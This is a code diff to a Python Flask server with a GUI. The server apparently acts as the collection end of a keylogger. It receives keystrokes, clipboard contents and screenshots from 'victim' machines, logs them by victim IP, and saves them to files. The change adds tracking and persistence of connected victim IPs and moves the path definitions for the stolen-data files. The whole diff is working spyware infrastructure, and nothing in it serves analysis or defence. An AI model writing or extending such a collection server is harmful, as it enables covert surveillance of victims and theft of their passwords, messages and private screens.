@@ -34,6 +34,20 @@ server = None
 logger = logging.getLogger()
 logger.setLevel(logging.INFO)
 
+# File paths and directories
+keystrokes_file_path = 'saved_keystrokes.txt'
+clipboard_file_path = 'saved_clipboard.txt'
+screenshots_dir = 'screenshots'
+connected_ips_file_path = 'connected_ips.txt'
+
+os.makedirs(screenshots_dir, exist_ok=True)
+
+# Flag for logging clipboard data and screenshot data
+show_clipboard_in_logs = True
+show_screenshot_logs = True
+
+connected_ips = set()
+
 class GUIHandler(logging.Handler):
     def __init__(self, log_widget):
         super().__init__()
@@ -68,7 +82,9 @@ def handle_post():
 
         victim_ip = request.remote_addr
 
-        logger.info(f"{victim_ip} connected")
+        if victim_ip not in connected_ips:
+            logger.info(f"{victim_ip} connected")
+            connected_ips.add(victim_ip)
 
         if keyboard_data:
             logger.info(f"Received Keystrokes from {victim_ip}: {keyboard_data}")
@@ -105,6 +121,16 @@ def save_screenshot(base64_data, victim_ip):
     with open(file_path, 'wb') as file:
         file.write(image_data)
 
+def load_connected_ips():
+    if os.path.exists(connected_ips_file_path):
+        with open(connected_ips_file_path, 'r') as file:
+            return set(line.strip() for line in file)
+    return set()
+
+def save_connected_ip(victim_ip):
+    with open(connected_ips_file_path, 'a') as file:
+        file.write(victim_ip + '\n')
+
 def run_flask():
     global server
     server = make_server('0.0.0.0', 8080, app)
@@ -116,17 +142,6 @@ def stop_flask():
         server.shutdown()
         server.server_close()
         server = None
-
-# File paths and directories
-keystrokes_file_path = 'saved_keystrokes.txt'
-clipboard_file_path = 'saved_clipboard.txt'
-screenshots_dir = 'screenshots'
-
-os.makedirs(screenshots_dir, exist_ok=True)
-
-# Flag for logging clipboard data and screenshot data
-show_clipboard_in_logs = True
-show_screenshot_logs = True
 
 class ServerGUI:
     def __init__(self, root):
